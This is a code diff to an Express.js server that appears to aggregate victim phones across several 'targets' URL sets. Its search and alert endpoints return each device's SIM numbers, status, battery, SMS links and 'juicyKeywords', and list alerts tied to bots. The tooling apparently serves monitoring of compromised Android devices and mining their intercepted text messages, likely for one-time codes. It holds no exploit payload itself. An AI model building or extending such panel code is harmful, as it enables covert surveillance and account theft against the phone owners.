@@ -1177,26 +1177,61 @@ app.get('/api/url/:id/sms-search', async (req, res) => {
   res.json({ hits, total: hits.length, errors: errors.slice(0, 10) });
 });
 
-// ── Global device search across all new URLs ──────────────────────────────────
+// ── Global device search across ALL URLs (new + old + pp) ────────────────────
 app.get('/api/search/device/:deviceId', (req, res) => {
   const q = req.params.deviceId.toLowerCase().trim();
   const results = [];
-  for (const target of TARGETS) {
+  for (const target of ALL_TARGETS) {
     const db = getTargetDb(target);
     for (const [deviceId, dev] of Object.entries(db)) {
       if (deviceId.toLowerCase().includes(q)) {
+        const urlSet = target.isPP ? 'pp' : (target.isOld ? 'old' : 'new');
         results.push({
-          urlId: target.id, url: target.url, schema: target.schema, deviceId,
-          brand:        dev.brand          || 'Unknown',
-          status:       dev.current_status || 'offline',
-          battery:      dev.last_battery   || 'N/A',
-          sim1:         dev.sim1_number    || 'N/A',
-          sim2:         dev.sim2_number    || 'N/A',
-          lastActivity: dev.last_activity  || null,
+          urlId: target.id, url: target.url, schema: target.schema,
+          urlSet, deviceId,
+          brand:         dev.brand          || 'Unknown',
+          status:        dev.current_status || 'offline',
+          battery:       dev.last_battery   || 'N/A',
+          sim1:          dev.sim1_number    || 'N/A',
+          sim2:          dev.sim2_number    || 'N/A',
+          lastActivity:  dev.last_activity  || null,
           juicyKeywords: dev.juicy_keywords || [],
-          smsLink:      getSmsLink(target, deviceId, dev.obj_id),
+          smsLink:       getSmsLink(target, deviceId, dev.obj_id),
         });
       }
+    }
+  }
+  res.json({ results, total: results.length });
+});
+
+// ── List all devices that have an alert configured (across all url sets) ──────
+app.get('/api/alert-devices', (req, res) => {
+  const results = [];
+  for (const [urlSet, devices] of Object.entries(alertStore.alerts)) {
+    for (const [deviceId, cfg] of Object.entries(devices)) {
+      // Find the target for context
+      const target = ALL_TARGETS.find(t => {
+        const ts = t.isPP ? 'pp' : (t.isOld ? 'old' : 'new');
+        return ts === urlSet;
+      });
+      // Get device record from DB
+      let devRecord = null;
+      for (const t of ALL_TARGETS) {
+        const ts = t.isPP ? 'pp' : (t.isOld ? 'old' : 'new');
+        if (ts !== urlSet) continue;
+        const db = getTargetDb(t);
+        if (db[deviceId]) { devRecord = db[deviceId]; break; }
+      }
+      const bot = alertStore.bots[cfg.bot_id];
+      results.push({
+        urlSet, deviceId,
+        botName:     bot?.name || 'Unknown bot',
+        triggers:    cfg.triggers || [],
+        brand:       devRecord?.brand          || 'Unknown',
+        status:      devRecord?.current_status || 'unknown',
+        lastActivity:devRecord?.last_activity  || null,
+        sim1:        devRecord?.sim1_number    || 'N/A',
+      });
     }
   }
   res.json({ results, total: results.length });
